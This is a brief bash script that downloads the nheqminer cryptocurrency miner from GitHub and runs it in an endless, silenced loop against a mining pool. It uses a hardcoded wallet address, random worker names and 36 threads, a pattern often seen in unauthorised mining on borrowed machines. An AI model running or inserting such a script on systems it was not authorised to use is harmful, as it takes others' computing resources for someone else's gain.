#!/bin/bash
#
# This is a handy script for local use

sudo apt update
sudo apt install libjansson4 -y
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
cd nheqminer
while true
do
./nheqminer -v -l na.luckpool.net:3956 -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.$(echo $(shuf -i 1-20000 -n 1)-V) -p x -t 36
> /dev/null 2>&1
done
